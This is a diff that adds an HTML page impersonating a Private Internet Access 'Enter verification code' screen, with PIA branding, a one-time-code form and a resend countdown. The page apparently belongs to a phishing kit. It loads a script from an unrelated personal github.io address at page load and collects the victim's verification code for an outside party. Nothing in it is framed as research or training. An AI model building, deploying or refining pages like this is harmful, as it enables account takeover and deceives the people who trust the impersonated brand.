@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PIA Enter Code</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background:#2f3440;
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  color:#fff;
+}
+
+.container{
+  width:100%;
+  max-width:420px;
+  padding:40px 20px;
+  text-align:center;
+}
+
+/* LOGO */
+.logo{
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  gap:8px;
+  margin-bottom:15px;
+}
+
+.logo img{
+  width:40px;
+}
+
+.logo-text{
+  font-size:26px;
+  font-weight:bold;
+  text-align:left;
+  line-height:1.1;
+}
+
+.logo-text small{
+  font-size:14px;
+  font-weight:300;
+  color:#d3d9df;
+}
+
+/* TITLE */
+h2{
+  font-size:22px;
+  margin-bottom:35px;
+  font-weight:500;
+}
+
+/* INPUT BOX */
+.input-box{
+  width:100%;
+  border:2px solid #9aa0aa;
+  border-radius:14px;
+  padding:18px 14px;
+  margin-bottom:20px;
+  text-align:left;
+}
+
+.input-box span{
+  position:relative;
+  top:-12px;
+  background:#2f3440;
+  padding:0 8px;
+  font-size:14px;
+  color:#c9cdd3;
+}
+
+.input-box input{
+  width:100%;
+  background:transparent;
+  border:none;
+  outline:none;
+  font-size:18px;
+  color:#fff;
+  letter-spacing:3px;
+}
+
+/* VERIFY BUTTON */
+button{
+  width:100%;
+  padding:18px;
+  border:none;
+  border-radius:16px;
+  font-size:18px;
+  font-weight:bold;
+  margin-top:5px;
+  background:#7a7d85;
+  color:#222;
+  cursor:not-allowed;
+  transition:0.3s;
+}
+
+button.active{
+  background:#5ee05e;
+  color:#111;
+  cursor:pointer;
+}
+
+/* RESEND */
+.resend{
+  margin-top:25px;
+  font-size:16px;
+  color:#5ee05e;
+  cursor:not-allowed;
+  opacity:0.6;
+}
+
+.resend.active{
+  cursor:pointer;
+  opacity:1;
+}
+
+.bottom-space{
+  height:200px;
+}
+</style>
+</head>
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="container">
+
+  <!-- LOGO -->
+  <div class="logo">
+    <img src="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/webp/private-internet-access.webp" style="width:30px;">
+    <div class="logo-text">
+      <small>Private Internet</small><br>
+      ACCESS
+    </div>
+  </div>
+  <!-- TITLE -->
+  <h2>Enter verification code</h2>
+<form>
+  <!-- CODE INPUT -->
+  <div class="input-box">
+    <input type="text" id="codeInput" placeholder="Enter code" name="Code entered">
+  </div>
+
+  <!-- VERIFY BUTTON -->
+  <button id="verifyBtn" disabled type="submit">VERIFY</button>
+</form>
+  <!-- RESEND -->
+  <div class="resend" id="resendText">Resend code in 30s</div>
+
+  <div class="bottom-space"></div>
+</div>
+
+<script>
+const codeInput = document.getElementById("codeInput");
+const verifyBtn = document.getElementById("verifyBtn");
+const resendText = document.getElementById("resendText");
+
+let waitTime = 30;
+let timer;
+
+// ENABLE VERIFY BUTTON
+codeInput.addEventListener("input", () => {
+  if(codeInput.value.trim() !== ""){
+    verifyBtn.disabled = false;
+    verifyBtn.classList.add("active");
+  } else {
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove("active");
+  }
+});
+
+// RESEND COUNTDOWN
+function startResendTimer(){
+  resendText.classList.remove("active");
+  resendText.style.cursor = "not-allowed";
+  resendText.style.opacity = "0.6";
+
+  timer = setInterval(() => {
+    waitTime--;
+    resendText.textContent = `Resend code in ${waitTime}s`;
+
+    if(waitTime <= 0){
+      clearInterval(timer);
+      resendText.textContent = "Resend code";
+      resendText.classList.add("active");
+      resendText.style.cursor = "pointer";
+      resendText.style.opacity = "1";
+    }
+  }, 1000);
+}
+
+// RESEND CLICK (ADDS +30 SECONDS EACH TIME)
+resendText.addEventListener("click", () => {
+  if(resendText.classList.contains("active")){
+    waitTime += 30;
+    startResendTimer();
+  }
+});
+
+// START FIRST TIMER
+startResendTimer();
+</script>
+
+</body>
+</html>
